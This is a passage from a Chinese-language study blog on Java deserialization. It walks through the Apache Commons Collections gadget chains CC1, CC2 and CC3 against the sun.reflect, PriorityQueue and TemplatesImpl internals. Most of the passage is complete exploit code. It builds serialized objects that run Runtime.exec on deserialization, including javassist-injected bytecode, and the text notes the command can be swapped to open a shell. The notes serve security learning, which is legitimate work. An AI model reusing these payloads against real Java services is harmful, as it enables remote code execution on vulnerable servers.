        URL#hashCode
        URLStreamHandler#hashCode
        URLStreamHandler#getHostAddress</code></pre><ul>
<li>CommonCollections1</li>
</ul>
<p>先说下环境的配置问题。因为cc链子好几条都只能用在jdk1.7下了所以得弄个jdk1.7的环境。开始打算用kali虚拟机现成的的jvm里的1.7,结果因为官方库已经没有openjdk7了，idea识别不到。所以只好又下了一个jdk1.7.</p>
<p>因为只是项目用，所以不需要添加环境变量什么的就可以了。不过需要注意的是idea项目切换jdk版本的话,尤其对于我们maven项目而言,一定要把设置里所有默认值都改为jdk1.7.包括：pom.xml里java version与maven 编译version;project structure里project sdk 以及modules;Language level;java Compiler version 全部调整为1.7才能不出错。<br>否则会在编译时报<code>无效的源</code>以及编译完后<code>无效的目标发行版</code>这两种错。<br>修改好后就没有什么好担心的了。开始maven导库审计吧。<br>pom.xml</p>
<pre><code class="xml">&lt;properties&gt;
        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
        &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;
        &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;
        &lt;java.version&gt;1.7&lt;/java.version&gt;
    &lt;/properties&gt;

    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
            &lt;version&gt;3.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
            &lt;version&gt;4.0&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.javassist&lt;/groupId&gt;
            &lt;artifactId&gt;javassist&lt;/artifactId&gt;
            &lt;version&gt;3.25.0-GA&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;</code></pre>
<p>首先是一个关于动态代理的例子。</p>
<blockquote>
<p>1.java中代理类的作用是:调用不可以直接被实例化的接口方法。<br>2.动态代理可以直接”创建”某个接口的实例，对其方法进行调用.<br>3.调用某个动态代理对象的方法时，都会触发代理类的invoke方法.</p>
</blockquote>
<p>先定义一个接口。它有一个helloworld方法。</p>
<pre><code class="java">package top.bycsec;

public interface Hello {
    void helloworld(String name);
}</code></pre>
<p>接下来调用这个exp。我们可以直接实例化一个handler.它实现了InvocationHandler这个接口。同时需要重写invoke方法。此处我们让他在方法名为helloworld时输出自定义内容<br>然后实例化一个代理对象hello.他需要ClassLoader,要代理的接口数组以及调用接口时触发的对应方法作为构造参数。<br>exp</p>
<pre><code class="java">package top.bycsec;

import java.lang.reflect.Proxy;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class exp {

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = new InvocationHandler(){

            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                if (method.getName().equals(&quot;helloworld&quot;)) {
                    System.out.println(&quot;Hello, &quot; + args[0]);
                }
                return null;
            }
        };
        Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Hello.class},handler);
        hello.helloworld(&quot;byc_404&quot;);
    }
}</code></pre>
<p>这样在我们调用接口的helloworld时。就会触发invoke方法里的内容。<br>输出<code>Hello, byc_404</code></p>
<p>接下来我们来看看cc1链子的内容。首先从执行命令的反射gadget开始。这里我确认过一遍，应该是第一部分跟CC5时就看过了。结果现在已经忘光了……所以再看一遍。</p>
<p>首先是commonscollections这个包里Trandsformer这个接口</p>
<pre><code class="java">package org.apache.commons.collections;

public interface Transformer {
    Object transform(Object var1);
}</code></pre>
<p>它实现了类型转换的功能。其中实现了这个接口的类主要有三个，也就是我们后面构造payload要用到的.</p>
<blockquote>
<p>InvokerTransformer<br>ConstantTransformer<br>ChainedTransformer<br>他们都实现了 Transformer 以及 Serializable接口。</p>
</blockquote>
<p>看下他们的transform方法<br>InvokeTransformer</p>
<pre><code class="java">public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
        } catch (NoSuchMethodException var5) {
            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
        } catch (IllegalAccessException var6) {
            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
        } catch (InvocationTargetException var7) {
            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);
        }
    }
}</code></pre>
<p>一个非常典型的反射调用方法的功能</p>
<p>ConstantTransformer</p>
<pre><code class="java">public Object transform(Object input) {
    return this.iConstant;
}

public ConstantTransformer(Object constantToReturn) {
    this.iConstant = constantToReturn;
}</code></pre>
<p>返回某参数。如果去看了它的构造方法就会发现其实transform是一个原封不动返回的功能。</p>
<p>ChainedTransformer</p>
<pre><code class="java">public Object transform(Object object) {
    for(int i = 0; i &lt; this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }

    return object;
}</code></pre>
<p>执行一个for循环进行循环调用。对每个传入的transformer都调用其transform方法并作为下一次的参数。</p>
<p>如果直接抽象点理解，大概是能理解下面的exp的</p>
<pre><code class="java">package top.bycsec;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;

public class cc1 {

    public static void main(String[] args){
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                        String.class, Class[].class }, new Object[] {
                        &quot;getRuntime&quot;, new Class[0] }),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;,
                        new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
        chain.transform(123);
    }
}</code></pre>
<p>整体上是一个ChainedTransformer循环调用transform的过程。其中ConstantTransformer获取到Runtime的类，后面循环调用了三个invoke获取方法执行。</p>
<p>下面细节化的解释下.毕竟cc链子所有命令执行部分都是这条链(没记错的话)</p>
<p>先说InvokeTransformer的transform方法。上面源码里说明了它主要是一个反射的过程。其接受的参数是一个对象。</p>
<pre><code class="java">try {
    Class cls = input.getClass();
    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
    return method.invoke(input, this.iArgs);</code></pre>
<p>最大的好处就是这里所有反射参数都是可控的。所以其实这里就能rce.</p>
<pre><code class="java">Runtime runtime = Runtime.getRuntime();
Transformer invoketransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;});
invoketransformer.transform(runtime);</code></pre>
<p>只不过显然我们没有直接传入一个<code>Runtime.getRuntime()</code>这样一个实例的可能。所以需要利用一下其他的类作辅助。</p>
<p>比如说上面提到的ConstantTransformer.其transform方法会返回自身。所以说可以</p>
<pre><code class="java">Object constantTransformer = new ConstantTransformer(Runtime.getRuntime()).transform(123);
Transformer invoketransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;});
invoketransformer.transform(constantTransformer);</code></pre>
<p>再加上ChainedTransform会调用其输入的transform这个特点，我们就可以进一步来到cc反射exp的雏形</p>
<pre><code class="java">ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
        new ConstantTransformer(Runtime.getRuntime()),
        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;})

});
chain.transform(123);</code></pre>
<p>此时已不再需要输入变量为对象，而是可以为任意值(此处为123)。</p>
<p>只不过这里有一个问题，我们曾经说过</p>
<blockquote>
<p>java反序列某类时,该类的所有属性必须是可序列化的</p>
</blockquote>
<p>此处Runtime.getRuntime()还是返回了runtime对象，它不是可序列化的。即反序列化时上述exp会报错抛出NotSerializableException。</p>
<p>当然解决方法也很简单，不允许直接获取的话，直接动态调用就好了。也就是继续用反射获取Runtime.<br>所以才有了最完整的exp中</p>
<pre><code class="java">ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
            String.class, Class[].class }, new Object[] {
            &quot;getRuntime&quot;, new Class[0] }),
    new InvokerTransformer(&quot;invoke&quot;, new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
    new InvokerTransformer(&quot;exec&quot;,
            new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
chain.transform(123);</code></pre>
<p>第一步反射使用getMethod获取getRuntime这个方法对象。再invoke获取getRuntime的执行结果。最后直接反射执行exec calc.或者传字符串数组执行特殊命令弹shell.</p>
<p>到这一步为止达成了： <strong>反序列化时执行transform方法即可rce</strong>.下面就是找可用类链子了。因为不可能直接就在readObject里调用transform吧。</p>
<p>下面是cc1中链子的开始。<br>org.apache.commons.collections.map.LazyMap 它实现了Serializable接口并存在readObject方法。</p>
<p>LazyMap的get方法</p>
<pre><code class="java">public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}</code></pre>
<p><code>this.factory.transform(key)</code>就是一个调用了transform的例子。那么只要factory可控就能调用上面的反射rce了。</p>
<p>看下构造方法。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/36.PNG" class="lazyload" data-srcset="36.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>虽然只要实例化的话就能控制factory了。但是这不是一个public的构造方法，在java中想要获取到这个构造方法还是得用反射。<br>此时的exp已经可以写成</p>
<pre><code class="java">public static void main(String[] args) throws Exception {

    ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                    String.class, Class[].class }, new Object[] {
                    &quot;getRuntime&quot;, new Class[0] }),
            new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                    Object.class, Object[].class }, new Object[] {
                    null, new Object[0] }),
            new InvokerTransformer(&quot;exec&quot;,
                    new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
    HashMap innermap = new HashMap();
    Constructor constructor = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;).getDeclaredConstructor(Map.class, Transformer.class);
    constructor.setAccessible(true);
    LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);
    map.get(123);
    }</code></pre>
<p>所以，最后也是最难的一点就是找到一个调用get并传递任意值的地方，来调用我们lazymap的get方法。这也就是作者的强大之处。</p>
<p>jdk1.7版本下找到的是sun.reflect.annotation.AnnotationInvocationHandler<br>注意你直接导入是导不了这个类的。可以在jre的rt.jar 中找到这个\sun\reflect\annotation\AnnotationInvocationHandler.class</p>
<pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();
        ......</code></pre>
<p>注意这里readObject又调用了<code>this.memberValues的entrySet</code>方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）</p>
<p>这也就是java 的动态代理机制。调用entryset这个方法实际上调用的是代理的<code>invoke</code>.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/37.PNG" class="lazyload" data-srcset="37.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>invoke里又调用了memberValues的get.那么只要令memberValues为我们构造好的Lazymap对象即可</p>
<p>final exp</p>
<pre><code class="java">package top.bycsec;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.HashBag;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import sun.reflect.annotation.AnnotationParser;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.IdentityHashMap;
import java.util.Map;

public class cc1 {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc&quot;}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Constructor constructor = Class.forName(&quot;org.apache.commons.collections.map.LazyMap&quot;).getDeclaredConstructor(Map.class, Transformer.class);
        constructor.setAccessible(true);
        HashMap hashMap = new HashMap&lt;String, String&gt;();
        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);

        constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);
        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), new Class[]{Map.class}, invo);

        constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Deprecated.class, proxy);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
        oos.writeObject(obj);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
        ois.readObject();
        ois.close();
    }
}</code></pre>
<ul>
<li>CommonCollections2</li>
</ul>
<p>首先注意是CommonsCollections4的依赖</p>
<p>起点是<br>java.util.PriorityQueue#readObject</p>
<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i &lt; size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in &quot;proper order&quot;, but the
    // spec has never explained what that might be.
    heapify();
}

private void heapify() {
    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)
        siftDown(i, (E) queue[i]);
}

private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}

private void siftDownUsingComparator(int k, E x) {
    int half = size &gt;&gt;&gt; 1;
    while (k &lt; half) {
        int child = (k &lt;&lt; 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right &lt; size &amp;&amp;
            comparator.compare((E) c, (E) queue[right]) &gt; 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) &lt;= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}</code></pre>
<p>这里queue可控。然后一条链走向heapify =&gt; siftDown =&gt; siftDownUsingComparator =&gt; comparator.compare</p>
<p>这里就可以开启新的gadget了。比如cc2链子中使用的是<br>org.apache.commons.collections4.comparators.TransformingComparator 的同名compare方法。</p>
<pre><code class="java">public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}</code></pre>
<p>transform方法的作用自然是之前的一套反射组合拳进行rce了。所以需要<code>transformer</code>可控。而从构造方法去看的话会发现也是可控的。</p>
<p>这里就可以写一个exp</p>
<pre><code class="java">package top.bycsec;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class cc2 {

    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                        String.class, Class[].class }, new Object[] {
                        &quot;getRuntime&quot;, new Class[0] }),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;,
                        new Class[] { String.class }, new Object[]{&quot;calc&quot;})});

        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(1);

        queue.add(1);
        queue.add(2);

        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
        field.setAccessible(true);
        field.set(queue,comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }


}</code></pre>
<p>这里首先注意queue加了两个元素，这是因为size不大于1的话无法进入siftDown方法。然后queue.add这段代码不能放到反射实例化comparator的后面。因为代码段中如果comparator不为null会放不进去元素。</p>
<p>然后其实上面这个exp并不是ysoserial CC2的exp链子。它使用的是javassist + TemplatesImpl。首先简单说明下javassist,它提供了修改字节码的功能。</p>
<p>比如我们手动生成一个byc404.class</p>
<pre><code class="java">package top.bycsec;

import javassist.*;

public class cc2 {
    public static void createPseson() throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass(&quot;byc&quot;);
        String cmd = &quot;System.out.println(\&quot;evil code\&quot;);&quot;;
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String ClassName = &quot;byc404&quot;;
        cc.setName(ClassName);
        // 写入.class 文件
        cc.writeFile();
    }

    public static void main(String[] args) {
        try {
            createPseson();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}</code></pre>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/38.PNG" class="lazyload" data-srcset="38.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>像这样能够直接控制static方法的话,那么它在实例化时就会被直接执行。</p>
<p>接下来看看它真正的核心TemplatesImpl的使用</p>
<pre><code class="java">public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}</code></pre>
<p>跟进getTransletInstance</p>
<pre><code class="java">private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></pre>
<p>这里defineTransletClasses()可以还原bytecode为class.后面的newInstance()则可以实例化这个class.在这个实例化的过程中static方法就会执行。所以达成了一个任意命令执行的效果。</p>
<p>再稍微多回顾下前面我们达到的进度，就是我们已经可以任意调用transform了,只需一个可控对象。那么这里再用之前经常用到的InvokerTransformer.transform反射来调用TemplatesImpl.newtransformer</p>
<p>最终exp</p>
<pre><code class="java">package top.bycsec;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class cc2 {

    public static void main(String[] args) throws Exception {
        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);

        TransformingComparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(1);

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;byc&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;

        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;byc404&quot; + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); 
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);

        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
        setFieldValue(templates, &quot;_class&quot;, null);

        Object[] queue_array = new Object[]{templates,1};

        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
        queue_field.setAccessible(true);
        queue_field.set(queue,queue_array);

        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
        size.setAccessible(true);
        size.set(queue,2);


        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
        comparator_field.setAccessible(true);
        comparator_field.set(queue,comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2&quot;));
            outputStream.writeObject(queue);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2&quot;));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }


}</code></pre>
<p>这个exp几个细节还是值得说明一下的。不过我还是偷懒下不深入了，就当做一些注意事项简单说明下。</p>
<p>1.为了进入<code>defineTransletClasses</code>需要把恶意类的父类设置为AbstractTranslet。否则_transletIndex会小于0爆出错误。<br>2.通过反射的方式来设置queue的值，而是直接add。这里我们queue的第一个元素是templates即TemplatesImpl.class.newInstance();。这是一个类。而第二个元素是1.这两个元素在add时会出现比较出错。所以得保证类型一致。不过还有一个方法就是里面放两个一样的元素即都为template.</p>
<ul>
<li>CommonsCollections3</li>
</ul>
<p>CC3又回到了CommonsCollections3.1的依赖。<br>有点像CC1+CC2。用到了两个链子的关键内容。</p>
<p>区别在于用了TrAXFilter调用newTransformer()</p>
<pre><code class="java">public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    }</code></pre>
<p>然后不同于以外的InvokeTransformer,它改用了InstantiateTransformer.其transform方法如下</p>
<pre><code class="java">public Object transform(Object input) {
    try {
        if (!(input instanceof Class)) {
            throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName()));
        } else {
            Constructor con = ((Class)input).getConstructor(this.iParamTypes);
            return con.newInstance(this.iArgs);
        }
</code></pre>
<p>这里创建了类实例，如果把input设置为TrAXFilter,那么就会在这里实例化的时候调用其构造方法，触发TemplatesImpl#newTransformer。</p>
<p>exp</p>
<pre><code class="java">package top.bycsec;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class cc3 {

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass(&quot;byc&quot;);
        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;

        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = &quot;byc404&quot; + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);

        setFieldValue(templates, &quot;_name&quot;, &quot;name&quot;);
        setFieldValue(templates, &quot;_class&quot;, null);

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);


        Constructor handler_constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Deprecated.class,map);

        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);

        Constructor AnnotationInvocationHandler_Constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Deprecated.class,proxy_map);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc3&quot;));
            outputStream.writeObject(handler);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc3&quot;));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
